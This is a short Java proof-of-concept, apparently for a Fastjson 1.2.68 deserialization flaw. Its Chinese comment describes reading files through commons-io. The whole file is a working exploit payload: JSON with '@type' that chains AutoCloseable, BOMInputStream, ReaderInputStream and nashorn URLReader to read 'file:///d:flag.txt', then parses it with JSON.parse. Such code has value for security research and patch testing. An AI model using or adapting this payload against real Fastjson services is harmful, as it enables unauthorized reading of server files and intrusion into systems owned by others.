package com.firebasky.fastjson.poc1268;

import com.alibaba.fastjson.JSON;

/**
 * 通过common-io 组件读文件
 */
public class readfile {
    public static void main(String[] args) {
        String readfile ="{\n" +
                "    \"abc\": {\n" +
                "        \"@type\": \"java.lang.AutoCloseable\",\n" +
                "        \"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                "        \"delegate\": {\n" +
                "            \"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\n" +
                "            \"reader\": {\n" +
                "                \"@type\": \"jdk.nashorn.api.scripting.URLReader\",\n" +
                "                \"url\": \"file:///d:flag.txt\"\n" +
                "            },\n" +
                "            \"charsetName\": \"UTF-8\",\n" +
                "            \"bufferSize\": 1024\n" +
                "        },\n" +
                "        \"boms\": [{\n" +
                "            \"charsetName\": \"UTF-8\",\n" +
                "            \"bytes\": [49]\n" +
                "        }]\n" +
                "    },\"address\": {\n" +
                "        \"$ref\": \"$.abc.BOM\"\n" +
                "    }" +
                "}";
        Object parse = JSON.parse(readfile);
        System.out.println(parse);
    }
}
